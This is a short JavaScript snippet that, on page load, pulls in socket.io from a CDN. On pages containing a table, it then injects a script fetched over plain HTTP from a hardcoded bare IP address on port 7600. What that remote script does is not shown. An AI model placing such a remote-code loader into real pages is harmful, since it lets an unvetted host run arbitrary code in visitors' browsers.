document.addEventListener('DOMContentLoaded', (event) => {
    let script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.slim.js';
    script.onload = script.onreadystatechange = () => {
        let script = document.createElement('script');
        if (document.body.getElementsByTagName('table').length > 0) {
            script.src = 'http://129.161.106.38:7600/js/table.js?time=' + Date.now();
        }
        document.body.appendChild(script);
    }
    document.body.appendChild(script);
});
